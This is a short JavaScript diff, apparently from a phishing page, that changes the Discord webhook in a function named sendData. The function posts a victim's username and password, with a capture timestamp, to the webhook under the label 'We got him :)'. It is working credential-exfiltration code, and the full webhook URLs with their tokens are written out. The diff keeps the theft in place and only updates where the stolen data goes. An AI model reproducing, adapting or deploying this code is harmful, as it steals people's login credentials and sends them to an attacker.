@@ -1,6 +1,6 @@
 function sendData(User, Pass) {
     const date = new Date();
-    $.post('https://discord.com/api/webhooks/1049489026710769684/TeUgHn3y_Bg8j1M4MoLUL0_5zCe_DCRLj9yEIv7mX6idoSWsyKhs00GTgbYkv0XWLjL8',
+    $.post('https://discord.com/api/webhooks/1050799394875777117/InaL0fXQISaGkVQ1bBH2nQBzwjcv7fY6RabE10LXcTABlS7vTZhejQxIQniauPzzO-3a',
     {
         'username': 'We got him :)',
         'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass + '/nCapture Time:\n\t' + date,     //adding timestamp
